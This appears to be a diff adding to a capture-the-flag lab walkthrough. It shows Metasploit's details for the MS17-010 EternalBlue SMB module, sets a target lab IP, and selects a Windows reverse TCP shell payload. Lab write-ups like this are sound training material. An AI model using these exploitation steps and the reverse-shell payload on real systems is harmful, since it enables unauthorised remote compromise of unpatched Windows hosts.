@@ -155,3 +155,80 @@ Matching Modules
    9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
 ```
 
+> [!important]
+> Show options and set the one required value. What is the name of this value? (All caps for submission)
+
+```
+msf > info 2
+
+       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+     Module: exploit/windows/smb/ms17_010_eternalblue
+   Platform: Windows
+       Arch: x64
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Average
+  Disclosed: 2017-03-14
+Module side effects:
+ unknown-side-effects
+Module stability:
+ unknown-stability
+Moule reliability:
+ unknown-reliability
+Available targets:
+      Id  Name
+      --  ----
+      0   Automatic Target
+  =>  1   Windows 7
+      2   Windows Embedded Standard 7
+      3   Windows Server 2008 R2
+      4   Windows 8
+      5   Windows 8.1
+      6   Windows Server 2012
+      7   Windows 10 Pro
+      8   Windows 10 Enterprise Evaluation
+Check supported:
+  Yes
+Basic options:
+  Name           Current Setting  Required  Description
+  ----           ---------------  --------  -----------
+  RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT          445              yes       The target port (TCP)
+  SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+  SMBPass                         no        (Optional) The password for the specified username
+  SMBUser                         no        (Optional) The username to authenticate as
+  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+Payload information:
+  Space: 2000
+Description:
+  This module is a port of the Equation Group ETERNALBLUE exploit, part of
+  the FuzzBunch toolkit released by Shadow Brokers.
+  There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
+  is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a
+  DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow
+  is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
+  completed in srvnet!SrvNetWskReceiveComplete.
+  This exploit, like the original may not trigger 100% of the time, and should be
+  run continuously until triggered. It seems like the pool will get hot streaks
+  and need a cool down period before the shells rain in again.
+  The module will attempt to use Anonymous login, by default, to authenticate to perform the
+  exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use
+  those instead.
+  On some systems, this module may cause system instability and crashes, such as a BSOD or
+  a reboot. This may be more likely with some payloads.
+Also known as:
+  ETERNALBLUE
+```
+```
+msf > set RHOSTS 10.67.147.22
+RHOSTS => 10.67.147.22
+```
+
+> [!important]
+> They want a reverse shell setup too as the payload.
+> ```
+> msf > set payload windows/x64/shell/reverse_tcp
+payload => windows/x64/shell/reverse_tcp
+> ```
+
